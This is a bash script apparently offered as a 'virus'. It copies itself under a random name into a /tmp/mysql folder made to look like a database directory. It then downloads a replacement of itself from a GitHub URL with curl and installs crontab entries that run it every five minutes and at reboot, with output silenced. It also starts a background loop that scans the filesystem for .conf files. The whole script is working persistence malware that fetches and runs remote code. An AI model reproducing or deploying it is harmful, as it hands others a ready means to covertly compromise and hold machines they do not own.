#!/bin/bash

GITHUB_SCRIPT_URL="https://github.com/Zend1X/virus/blob/main/virus.sh"
MYSQL_DIRS=("/tmp/mysql")

generate_random_name() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
}

find_mysql_dir() {
    for dir in "${MYSQL_DIRS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        if [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    mkdir -p "/tmp/mysql" 2>/dev/null
    echo "/tmp/mysql"
}

main() {
    MYSQL_DIR=$(find_mysql_dir)
    RANDOM_NAME=$(generate_random_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME.sh"

    if [ "$0" != "$SCRIPT_PATH" ] && [ ! -f "$SCRIPT_PATH" ]; then
        cp "$0" "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
    fi

    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        echo "Устанавливаем задания в crontab..."
        
        curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
        
        TMP_CRON=$(mktemp)
        crontab -l 2>/dev/null > "$TMP_CRON"
        
        if ! grep -q "$SCRIPT_PATH" "$TMP_CRON"; then
            echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TMP_CRON"
            echo "@reboot $SCRIPT_PATH >/dev/null 2>&1" >> "$TMP_CRON"
        fi
        
        sed -i '/^$/d' "$TMP_CRON"
        crontab "$TMP_CRON"
        rm "$TMP_CRON"
        
        echo "Готово!"
    fi

    while true; do
        find / -name "*.conf" 2>/dev/null | head -100 > /dev/null
        sleep 60
    done &
}

main
